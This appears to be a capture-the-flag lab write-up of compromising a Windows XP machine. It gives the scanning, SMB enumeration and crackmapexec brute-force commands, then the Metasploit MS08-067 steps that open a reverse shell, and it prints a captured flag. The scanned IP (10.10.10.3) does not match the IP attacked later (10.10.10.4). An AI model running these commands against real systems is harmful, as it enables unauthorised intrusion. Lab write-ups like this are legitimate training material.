The researcher started out with a scan of the host (10.10.10.3) using rustscan^1^
Command: rustscan -a 10.10.10.3

|Status|IP|Port|
| -----|--|----------- |
| Open | 10.10.10.4 | 135 |
| Open | 10.10.10.4 | 139 |
| Open | 10.10.10.4 | 445 |

The researcher then started with testing from the lowest port. 

PORT 135:
Checked for guest access 
Command: rpcclient -U '%' -N 10.10.10.4
I was able to input commands, but all were met with a access denied 

PORT 139/445:
Started with my normal commands to check for access.
Command: smbmap -u "" -p "" -P 445 -H 10.10.10.4 && smbmap -u "guest" -p "" -P 445 -H 10.10.10.4
Both commands failed to map. 

I then ran enum4linux. 
Command: enum4linux -a -u "" -p "" 10.10.10.4 && enum4linux -a -u "guest" -p "" 10.10.10.4
Again both commands failed to produce any real results, but while checking the password policy I did get an error `Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)` 
for this I did try to brute for a user and password using list from seclist.^2^
To brute force this I used crackmapexec
Command: crackmapexec smb 10.10.10.4 -u usernames.txt -p rockyou.txt
After a few minutes of this I stopped because I was way over thinking this box. 

Going back to my rustscan I then looked at the services running and the versions numbers for the service.  I found that SMB was running ver.2 SMBv2 and the operating system was Windows xp. 
After some googling for `windows xp remote code execution` The first attack I found was MS08-067.
Since this box is one of the oldest on the platform all searches for manual exploit brought me to other HTB write ups. Since this was the case I opted for the metasploit way.

Command: msfconsole
Command: use windows/smb/ms08_067_netapi
Command: set RHOST 10.10.10.4
Command: set LHOST 10.10.16.10
Command: Run

Got a shell. 
Since this is an admin user I was able to get both the user and root flags.
Flag e69af0e4f443de7e36876fda4ec7644f
Flag 

REF
1. https://github.com/RustScan/RustScan
2. https://github.com/danielmiessler/SecLists
